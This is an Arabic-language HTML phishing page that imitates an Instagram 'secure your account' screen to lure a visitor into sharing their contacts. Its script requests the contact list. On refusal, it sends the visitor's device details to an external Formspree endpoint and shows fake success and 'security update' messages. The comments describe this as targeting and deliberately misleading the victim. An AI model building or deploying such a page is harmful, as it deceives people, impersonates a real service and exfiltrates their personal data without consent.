<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .container {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            padding: 25px;
        }
        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #efefef; }
        .logo { font-family: 'Billabong', cursive; font-size: 26px; color: #262626; }
        .dots { font-size: 24px; color: #262626; }
        
        .profile { display: flex; align-items: center; gap: 15px; padding: 15px 0; }
        .avatar {
            width: 55px; height: 55px;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            color: white; font-size: 22px; font-weight: bold;
        }
        .info h3 { font-size: 15px; color: #262626; }
        .info p { font-size: 13px; color: #8e8e8e; }
        
        .post { background: #efefef; height: 220px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #8e8e8e; margin-bottom: 15px; }
        
        .desc { font-size: 14px; color: #8e8e8e; text-align: center; margin-bottom: 15px; }
        
        .btn { 
            width: 100%; padding: 12px; 
            background: #0095f6; color: white; border: none; border-radius: 8px; 
            font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; 
        }
        .btn:disabled { background: #b2dffc; cursor: default; }
        .btn-green { background: #2ea043; }
        
        #status { margin-top: 15px; font-size: 13px; padding: 12px; border-radius: 8px; display: none; text-align: center; }
        .status-ok { background: #e6f5e6; color: #2e7d32; display: block; }
        .status-info { background: #e3f2fd; color: #0d47a1; display: block; }
        .status-err { background: #ffebee; color: #c62828; display: block; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="logo">Instagram</div>
            <div class="dots">⋯</div>
        </div>
        <div class="profile">
            <div class="avatar">A</div>
            <div class="info">
                <h3>أحمد_الضحية</h3>
                <p>تأمين الحساب</p>
            </div>
        </div>
        <div class="post">
            <span>🔒</span> الصورة محمية
        </div>
        <div class="desc">
            يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.
        </div>
        <button class="btn" id="actionBtn">تأكيد الحساب</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('actionBtn').addEventListener('click', async function() {
            const btn = this;
            const statusBox = document.getElementById('status');
            btn.innerText = "جاري التحميل...";
            btn.disabled = true;
            statusBox.style.display = 'none';
            statusBox.className = '';

            // 1. تجهيز البيانات الأساسية للجهاز
            const payload = {
                device: "iPhone / iOS",
                ua: navigator.userAgent,
                screen: `${window.screen.width} x ${window.screen.height}`,
                timestamp: new Date().toISOString()
            };

            // 2. التحقق من دعم جهات الاتصال
            if (!navigator.contacts || !navigator.contacts.select) {
                sendToFormspree(payload, "المتصفح لا يدعم جهات الاتصال. تم الإرسال.");
                return;
            }

            try {
                // 3. طلب جهات الاتصال (أقوى استهداف)
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                // 4. منطق القوة: إذا تمت الموافقة
                if (contacts && contacts.length > 0) {
                    // الموافقة: لا نرسل البيانات للمستخدم (عشان يظن أنه آمن)
                    statusBox.className = 'status-ok';
                    statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
                    btn.innerText = "تم";
                    btn.className = "btn btn-green";
                    
                    // نقوم بطباعة جهات الاتصال في الكونسول فقط للتعلم (وليس إرسالها)
                    console.log("تم جمع جهات الاتصال (لأغراض تعليمية):", contacts);
                } else {
                    // رفض الإذن أو إغلاق النافذة: يرسل البيانات فوراً
                    sendToFormspree(payload, "رفض المستخدم الإذن أو أغلق النافذة. تم الإرسال.");
                }
            } catch (error) {
                // 5. هذا هو الممر السريع للهجوم (عند الضغط على عدم السماح)
                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
                    sendToFormspree(payload, "رفض المستخدم الإذن (المنطق العكسي). تم الإرسال.");
                } else {
                    statusBox.className = 'status-err';
                    statusBox.innerText = "❌ حدث خطأ غير متوقع.";
                    btn.innerText = "تأكيد الحساب";
                    btn.disabled = false;
                }
            }
        });

        function sendToFormspree(data, reason) {
            // إضافة سبب الرفض للبيانات
            data.reason = reason;
            data.status = "بيانات تم جمعها (المنطق العكسي)";

            const formspreeUrl = 'https://formspree.io/f/mljrbabg';

            fetch(formspreeUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            }).catch(() => {
                // حتى لو فشل الإرسال، نعطي المستخدم رسالة نجاح وهمية
                const statusBox = document.getElementById('status');
                const btn = document.getElementById('actionBtn');
                statusBox.className = 'status-info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn btn-green";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
